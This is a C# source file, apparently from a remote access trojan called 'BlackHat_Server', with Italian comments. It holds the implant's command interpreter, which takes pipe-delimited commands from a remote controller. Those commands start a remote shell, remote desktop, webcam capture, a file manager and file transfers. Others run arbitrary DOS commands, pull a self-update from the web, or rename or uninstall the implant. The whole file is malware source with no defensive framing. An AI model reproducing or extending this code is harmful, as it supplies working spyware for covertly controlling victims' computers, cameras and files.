using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

namespace BlackHat_Server
{
    // OGGETTO CHE AVVIA IL THREAD RELATIVO AD UN COMANDO DA CLIENT (RICEVUTO DA GUARDIAN)
    class CmdInterpreter
    {

        /// <summary>
        /// AVVIA IL THREAD RELATIVO AL COMANDO
        /// </summary>
        /// <param name="cmd"></param>
        public void Interpreter(string cmd)
        {
            string[] cmdPar = cmd.Split('|');

            switch (cmdPar[0])
            {
                //// COMANDO CIAO AVVIO TEST COMANDO
                //case "ciao":
                //    CiaoTest ct = new CiaoTest();
                //    ct.StartCiao();
                //    break;

                //CONTROLLO SERVER ATTIVO => RISPONDO I'M HERE
                case "ARE YOU THERE?":
                    MsgManager mm = new MsgManager(ST_Client.Instance.Connessione.GetStream());
                    mm.SendEncryMessage("I'M HERE",5000);
                    break;


                
                //RICHIESTE SERVER
                #region
                // COMANDO CHIUSURA SERVER                
                case "BH_CLOSE_SERVER":
                    ST_Client.Instance.Connessione.Close();
                    Environment.Exit(0);
                    break;

                // COMANDO RIAVVIO SERVER                
                case "BH_RESTART_SERVER":
                    ST_Client.Instance.Connessione.Close();
                    Application.Restart();
                    break;

               // COMANDO CHIUSURA CONNESSIONE             
                case "BH_DISCONNECT_SERVER":
                    ST_Client.Instance.isConnected = false;
                    break;

                // COMANDO DISINSTALLAZIONE CONNESSIONE             
                case "BH_UNINSTALL_SERVER":
                    ServerAgent sa = new ServerAgent();
                    sa.UninstallServer(true);
                    break;

                // COMANDO DISINSTALLAZIONE CONNESSIONE             
                case "BH_WEBUPLOAD_SERVER":
                    ServerAgent saup = new ServerAgent();
                    saup.StartUpdateServerWeb(cmdPar[1]);
                    break;

                    


                //COMANDO DI RINOMINA DEL SERVER
                case "BH_RENAME_SERVER":
                    ST_Client.Instance.ServerName = cmdPar[1];

                    RegistryManager rm = new RegistryManager();
                    Text_Des td = new Text_Des();

                    rm.SetNewNameInRegistry(td.Encrypt(cmdPar[1], true));

                    break;
                //------------------



               

                #endregion


                // RICHIESTE REMOTE SHELL
                case   "REMOTE_SHELL":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    //-------------------------
                    break;




                //RICHIESTE MANAGER
                #region
                    
                // COMANDO AVVIO FILEMANAGER
                case "FILEMANAGER":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);                       
                    }
                    //-------------------------
                    
                    break;

                // COMANDO AVVIO Nuova Slot Image Tranfer
                case "IMAGESLOT":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    //-------------------------                    
                    break;

                // COMANDO AVVIO Nuova Slot Gallery Tranfer
                case "GALLERYSLOT":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    //-------------------------                    
                    break;

                // COMANDO AVVIO Nuova Slot FILE Tranfer
                case "FILE_TRANSFER":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    //-------------------------                    
                    break;


                // COMANDO AVVIO Nuova Slot Search
                case "SEARCHSLOT":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter ms = new ModuleStarter();
                        ms.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    //-------------------------                    
                    break;

                    

                #endregion
                //--------------

                // RICHIESTE DESKTOP
                #region
                // COMANDO NUOVA COMUNICAZIONE REMOTE DESKTOP         
                case "REMOTE_DESKTOP":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter mds = new ModuleStarter();
                        mds.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    break;
                #endregion
                //---------------

                #region RICHIESTE WEBCAM
                case "WEBCAM_CAPTURE":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter mds = new ModuleStarter();
                        mds.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    break;
                    
                #endregion

                #region RICHIESTE SERVER INFO
                case "SYSTEM_INFO":
                    // START NUOVA SLOT
                    if (cmdPar[1] == "START")
                    {
                        ModuleStarter mds = new ModuleStarter();
                        mds.StartSlotService(cmdPar[0], cmdPar[2]);
                    }
                    break;

                #endregion


                #region RICHIESTE VARIE
                case "BH_RUN_DOS_CMD":
                    DosRunner dr = new DosRunner();
                    dr.ExecuteCommand(cmdPar[1]);
                   
                    break;


                #endregion



                // COMANDO NON RICONOSCIUTO
                default:
                    break;
            }

        }
        //-------------------------------------

    }
}
